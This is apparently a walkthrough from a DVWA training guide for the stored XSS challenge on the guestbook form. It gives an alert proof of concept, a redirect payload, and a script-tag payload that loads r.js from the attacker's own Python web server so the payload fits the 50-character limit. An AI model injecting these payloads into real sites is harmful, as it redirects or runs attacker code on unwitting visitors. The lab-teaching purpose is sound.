<b>Challenge URL:</b> /dvwa/vulnerabilities/xss_s/
<br>
<b>Objective:</b> Redirect everyone to a web page of your choosing.
<br>
<b>Tools needed:</b> A temporary web server
<br><br>
<i>Did you remember to read this section's <a href="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/README.md">README</a>?</i>

<h2><b>The Guide</b></h2>

<h3><b>Exploring the Form</b></h3>

Okay, let's start in the normal place, the provided form:

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/xsssform.png" width="500">

This form has two input fields, "Name" and "Message". Upon clicking the "Sign Guestbook" button, the two fields get echoed below the form:

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/xssstest.png" width="500">

So let's do a proof-of-concept XSS test as such:

<code>&#60;script&#62;alert("XSS Message Field")&#60;/script&#62;</code>

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/xssstestalert.png" width="500">

We could in theory test the "Name" field as well, but the code snippet above gets truncated. When we inspect the source code, we see why - the form restricts "Name" input to 10 characters and "Message" input to 50 characters.

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/xssstestsource.png" width="500">

This may present some hiccups going forward, but right now, it basically means we will only exploit the XSS vulnerability in the "Message" field.

<h3><b>Exploiting the Form</b></h3>

Let's do one more test - refresh the page. Click through the Firefox warning about resubmission of forms. You should get the same <code>alert</code> as before. This means that when we craft our exploit, the form will preserve the XSS, and everyone who then visits the page will get redirected. Let's clear the guestbook by clicking the "Clear Guestbook" button so we don't deal with more popups.

We know in order to beat the challenge, we must find some way in Javascript to redirect to a different web page. A <a href="https://www.w3schools.com/howto/howto_js_redirect_webpage.asp" target="_blank">quick Google search</a> provides the following code snippet:

<code>window.location.replace("http://www.google.com");</code>

So logically speaking, our exploit becomes:

<code>&#60;script&#62;window.location.replace("http://www.google.com");</script></code>

But wait, that's 66 characters. We saw by reviewing the source that we have to keep whatever we put in the "Message" field under 50 characters. We thankfully do have a workaround, which we've kind of used in the other XSS challenges. Essentially, we can stand up a temporary web server, hosting a Javascript file with our payload, and craft our exploit such that it calls the payload on our server. In practice:

<ul>
  <li>Set up your server with: <code>python -m SimpleHTTPServer 80</code>
    <ul>
      <li>We set the <code>port</code> argument to 80 so we don't need to specify a port in our exploit. That will save us 5 characters. Note that you may need to kill your running Apache instance with <code>service apache2 stop</code> for this to work.</li>
    </ul>
  </li>
  <li>Payload: <code>window.location.replace("http://www.google.com");</code>
    <ul>
      <li>We'll save this as with a short name to save even more characters. I chose "r.js".</li>
    </ul>
  </li>
  <li>Exploit: <code>&#60;script src=http://[your_Kali_IP]/r.js&#62;&#60;/script&#62;</code></li>
</ul>

With this setup, your exploit should be around 48 characters in length, give or take a few depending on your IP address or file name. That's the perfect length, and we should be able to implement the attack.

Let's go back to the form and try it out! For "Name", put anything you want, like "test". For "Message", input our shortened exploit.

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/xsssexploit.png" width="500">

Inspecting the new guestbook entry (Right-click > "Inspect Element") and reviewing the source code shows us that we successfully inserted the malicious script into our web page:

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/xsssexploitsource.png" width="700">

Looking at the Python web server shows a successful attempt to retrieve our payload:

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/xsssexploitweb.png" width="500">

And if we refresh the page and click through the Firefox warning, we can confirm we get redirected to http://www.google.com/ as we wanted!

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/xsssexploitsuccess.png" width="500">

Challenge complete!
